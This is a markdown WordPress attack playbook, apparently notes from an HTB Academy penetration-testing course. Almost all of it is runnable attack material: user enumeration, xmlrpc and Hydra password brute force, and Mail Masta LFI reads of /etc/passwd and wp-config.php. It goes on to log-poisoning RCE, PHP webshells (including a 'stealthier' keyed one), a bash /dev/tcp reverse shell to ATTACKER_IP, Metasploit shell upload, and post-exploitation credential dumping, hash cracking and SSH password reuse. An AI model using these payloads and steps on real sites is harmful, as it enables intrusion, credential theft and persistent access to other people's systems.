# WordPress Methodology

> **Source:** HTB Academy — Attacking Common Applications
> **When you see WordPress, run this playbook top to bottom.**

---

## 1. Discovery & Fingerprinting

Before you enumerate anything, confirm it's actually WordPress. Don't waste cycles on a custom CMS that happens to have a `/blog` path.

- [ ] Check page source for WordPress signatures:
```bash
curl -s http://$TARGET | grep -iE 'wordpress|wp-content|wp-includes|meta.*generator'
```
- [ ] Hit default WordPress paths and note response codes:
```bash
for path in /wp-admin/login.php /wp-login.php /xmlrpc.php /wp-content/ /wp-includes/ /wp-json/; do
  echo -n "$path → "; curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$path"
  echo
done
```
- [ ] Screenshot with EyeWitness (bulk targets):
```bash
eyewitness --web -f targets.txt -d eyewitness_output
```
- [ ] Screenshot with Aquatone (alternative):
```bash
cat targets.txt | aquatone -out aquatone_output
```
- [ ] Check Wappalyzer browser extension results (quick visual confirmation)
- [ ] Note the WordPress version from the `meta generator` tag or `/wp-links-opml.php`

**Decision point:** If WordPress confirmed → proceed to Section 2. If unsure → check `/readme.html` (often left exposed, contains version).

---

## 2. Core Enumeration with WPScan

WPScan is your primary tool. One command gives you plugins, themes, users, and known CVEs.

- [ ] Run full enumeration:
```bash
wpscan --url http://$TARGET --enumerate ap,at,u --api-token $WPSCAN_TOKEN
```

| Flag | Meaning |
|------|---------|
| `ap` | All plugins (not just popular) |
| `at` | All themes |
| `u` | Users (via multiple methods) |
| `cb` | Config backups |
| `dbe` | Database exports |

- [ ] Aggressive plugin detection (slower but catches more):
```bash
wpscan --url http://$TARGET --enumerate ap --plugins-detection aggressive --api-token $WPSCAN_TOKEN
```
- [ ] Force scan even if WAF detected:
```bash
wpscan --url http://$TARGET --enumerate ap,at,u --force --api-token $WPSCAN_TOKEN
```

> **API Token:** Register at [wpscan.com](https://wpscan.com/) — free tier gives 25 API requests/day. Without a token you still get enumeration but no vulnerability data.

- [ ] Save output for reference:
```bash
wpscan --url http://$TARGET --enumerate ap,at,u --api-token $WPSCAN_TOKEN -o wpscan_$TARGET.txt
```

---

## 3. User Enumeration

Users are your brute force target list. Enumerate before you attack.

### Method 1: Author ID Brute Force
WordPress redirects `/?author=N` to `/author/username/` — leaking the username in the URL.

- [ ] Manual check:
```bash
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "http://$TARGET/?author=1"
```
- [ ] Automated loop (IDs 1–50):
```bash
for i in $(seq 1 50); do
  result=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "http://$TARGET/?author=$i")
  code=$(echo "$result" | awk '{print $1}')
  if [ "$code" = "301" ] || [ "$code" = "302" ]; then
    echo "ID $i → $result"
  fi
done
```

### Method 2: REST API
- [ ] Query the users endpoint directly:
```bash
curl -s http://$TARGET/wp-json/wp/v2/users | jq '.[].slug'
```
> If the endpoint is disabled, you'll get a 401 or 404. Fall back to Method 1.

### Method 3: WPScan
- [ ] Dedicated user enum:
```bash
wpscan --url http://$TARGET --enumerate u
```

- [ ] Compile discovered usernames into a file:
```bash
echo "admin" > users.txt
# Add discovered usernames below
```

---

## 4. Login Brute Force

Two attack surfaces: the login form and XML-RPC. **Always try xmlrpc first** — it's faster and often less monitored.

### xmlrpc.php — Preferred Method
The `system.multicall` method lets you test hundreds of credentials in a single HTTP request. Way faster than form-based brute force.

- [ ] Confirm xmlrpc.php is enabled:
```bash
curl -s -X POST http://$TARGET/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
```
- [ ] Brute force via WPScan (xmlrpc):
```bash
wpscan --url http://$TARGET --password-attack xmlrpc -U admin -P /usr/share/wordlists/rockyou.txt
```
- [ ] With a user list:
```bash
wpscan --url http://$TARGET --password-attack xmlrpc -U users.txt -P /usr/share/wordlists/rockyou.txt
```

### wp-login.php — Fallback
- [ ] Hydra against the login form:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```
> Adjust the failure string (`F=`) based on what the target returns. It might be "Invalid username", "incorrect password", "Error", etc.

- [ ] WPScan wp-login fallback:
```bash
wpscan --url http://$TARGET --password-attack wp-login -U admin -P /usr/share/wordlists/rockyou.txt -t 50
```

**Decision point:**
- Creds found → Section 6 (Theme Editor RCE) or Section 7 (Metasploit)
- No creds → Section 5 (plugin vulns, unauthenticated exploits)

---

## 5. Known Plugin Vulnerabilities (Unauthenticated)

Always check for vulnerable plugins. These give you a foothold without credentials.

- [ ] Search for exploits:
```bash
searchsploit wordpress $(cat plugin_name.txt)
```

### Mail Masta 1.0 — Local File Inclusion (CVE-2016-10956)

**Vulnerable parameter:** `pl=` in two different files.

- [ ] Test LFI — Primary path:
```bash
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```
- [ ] Test LFI — Secondary path:
```bash
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd"
```
- [ ] Read wp-config.php via PHP filter (bypass read restrictions):
```bash
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../wp-config.php" | base64 -d
```

**Escalation — LFI to RCE:**

| Technique | How |
|-----------|-----|
| Log poisoning | Inject PHP into User-Agent → include access.log via LFI |
| `/proc/self/environ` | Include environment variables containing injected PHP |
| PHP filter chain | Use `php://filter` chains to write arbitrary PHP (no write needed) |
| Session files | Inject PHP into session data → include `/tmp/sess_SESSIONID` |

- [ ] Log poisoning example:
```bash
# Step 1: Inject PHP into access log via User-Agent
curl -s "http://$TARGET/" -A "<?php system(\$_GET['cmd']); ?>"

# Step 2: Include the log file via LFI
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2/access.log&cmd=id"
```

### wpDiscuz 7.0.4 — Arbitrary File Upload (CVE-2020-24186)

Unauthenticated file upload via comment attachments. The plugin fails to properly validate file types.

- [ ] Craft a PHP webshell with GIF header to bypass validation:
```bash
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif
```
- [ ] Upload via comment attachment functionality (through the browser or script the POST request)
- [ ] Find the uploaded file:
```bash
# Files land in /wp-content/uploads/YYYY/MM/
curl -s "http://$TARGET/wp-content/uploads/$(date +%Y)/$(date +%m)/shell.php.gif?cmd=id"
```

> **Note:** The exact upload path and bypass method may vary. Check the [exploit on ExploitDB](https://www.exploit-db.com/exploits/49967) for the full PoC.

---

## 6. Authenticated RCE — Theme Editor

**Requires:** Admin credentials. This is your go-to once you have an admin login.

The WordPress Theme Editor lets you modify PHP files directly from the dashboard. The `404.php` template is the best target because you can trigger it reliably.

- [ ] Login to `/wp-admin/`
- [ ] Navigate: **Appearance → Theme Editor → Select 404 Template** (`404.php`)
- [ ] Note the active theme name (visible in the editor)
- [ ] Replace `404.php` contents with a webshell:

**Simple command execution (quick and dirty):**
```php
<?php system($_GET['cmd']); ?>
```

**Stealthier webshell with authentication:**
```php
<?php
if(md5($_GET['key']) === '21232f297a57a5a743894a0e4a801fc3') { // key=admin
    system($_GET['cmd']);
}
?>
```

- [ ] Click **Update File**
- [ ] Trigger the webshell:
```bash
# Simple version
curl -s "http://$TARGET/wp-content/themes/THEME_NAME/404.php?cmd=id"

# Authenticated version (key=admin)
curl -s "http://$TARGET/wp-content/themes/THEME_NAME/404.php?key=admin&cmd=id"
```
- [ ] Escalate to reverse shell:
```bash
curl -s "http://$TARGET/wp-content/themes/THEME_NAME/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/PORT+0>%261'"
```
- [ ] Set up listener first:
```bash
nc -lvnp PORT
```

> **Tip:** If the Theme Editor is disabled (common hardening), try the Plugin Editor instead: **Plugins → Plugin Editor** — edit any installed plugin's PHP file.

---

## 7. Authenticated RCE — Metasploit

**Requires:** Admin credentials. Automated alternative to Theme Editor — uploads a malicious plugin.

- [ ] Launch Metasploit and configure:
```bash
msfconsole -q
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS $TARGET
set RPORT 80
set TARGETURI /
set USERNAME admin
set PASSWORD <password>
set LHOST $ATTACKER_IP
set LPORT 4444
exploit
```

> This uploads a plugin containing a Meterpreter payload, activates it, then cleans up. Stealthier than a webshell if you clean traces.

---

## 8. Post-Exploitation

Once you have code execution, grab everything useful before pivoting.

### wp-config.php — Always Read This First
- [ ] Grab database credentials:
```bash
cat /var/www/html/wp-config.php | grep -i 'DB_NAME\|DB_USER\|DB_PASSWORD\|DB_HOST'
```

Expected output format:
```php
define('DB_NAME', 'wordpress_db');
define('DB_USER', 'wp_admin');
define('DB_PASSWORD', 'SuperSecret123');
define('DB_HOST', 'localhost');
```

- [ ] Check for authentication keys and salts (useful for cookie forging):
```bash
cat /var/www/html/wp-config.php | grep -i 'AUTH_KEY\|SECURE_AUTH\|LOGGED_IN\|NONCE'
```

### Credential Reuse
- [ ] Try DB password for SSH:
```bash
ssh $DB_USER@$TARGET  # Use DB_PASSWORD
ssh root@$TARGET      # Try password reuse
```
- [ ] Try DB password for other system users:
```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

### Additional Loot
- [ ] Check for debug log (goldmine of errors, paths, and sometimes credentials):
```bash
cat /var/www/html/wp-content/debug.log
```
- [ ] Enumerate uploaded files for sensitive data:
```bash
find /var/www/html/wp-content/uploads/ -type f -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*" -o -name "*.txt" -o -name "*.bak" -o -name "*.sql"
```
- [ ] Check for backup files:
```bash
find /var/www/html/ -name "*.bak" -o -name "*.old" -o -name "*.save" -o -name "*~" -o -name "*.swp"
```
- [ ] Historical endpoint discovery:
```bash
waybackurls $TARGET | grep -iE 'wp-content|upload|backup|config|\.sql|\.zip'
```
- [ ] Connect to the database and dump user hashes:
```bash
mysql -u $DB_USER -p'$DB_PASSWORD' -h $DB_HOST $DB_NAME -e "SELECT user_login, user_pass FROM wp_users;"
```
- [ ] Crack WordPress hashes (phpass format):
```bash
hashcat -m 400 wp_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 9. Quick Reference — Decision Tree

```
WordPress Found
├── 1. WPScan full enum (--enumerate ap,at,u)
│   ├── Note version, plugins, themes, users
│   └── Cross-ref plugin versions with searchsploit / WPScan vulndb
│
├── 2. User Enumeration
│   ├── ?author=N loop
│   ├── /wp-json/wp/v2/users
│   └── Compile user list → users.txt
│
├── 3. Login Attack
│   ├── xmlrpc.php multicall (PREFERRED — faster)
│   └── wp-login.php form brute (FALLBACK)
│
├── 4. Plugin Vulnerabilities (unauthenticated)
│   ├── Mail Masta → LFI → escalate to RCE
│   ├── wpDiscuz → file upload → webshell
│   └── searchsploit wordpress [plugin] [version]
│
├── 5. Have Admin Creds?
│   ├── YES
│   │   ├── Theme Editor → 404.php → webshell → reverse shell
│   │   ├── Plugin Editor → edit any plugin PHP file
│   │   └── Metasploit wp_admin_shell_upload
│   └── NO
│       ├── Brute force (xmlrpc preferred)
│       ├── Default creds (admin:admin, admin:password)
│       └── Unauthenticated CVE exploit
│
└── 6. Post-Exploitation
    ├── wp-config.php → DB creds
    ├── DB password reuse → SSH / other services
    ├── Dump wp_users → crack hashes
    ├── debug.log, uploads, backups
    └── Pivot to internal network
```

---

## External References

- [WPScan Documentation](https://github.com/wpscanteam/wpscan)
- [WordPress Codex — File Structure](https://developer.wordpress.org/advanced-administration/wordpress/files/)
- [HackTricks — WordPress Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
- [CVE-2016-10956 — Mail Masta LFI](https://www.exploit-db.com/exploits/40290)
- [CVE-2020-24186 — wpDiscuz RCE](https://www.exploit-db.com/exploits/49967)
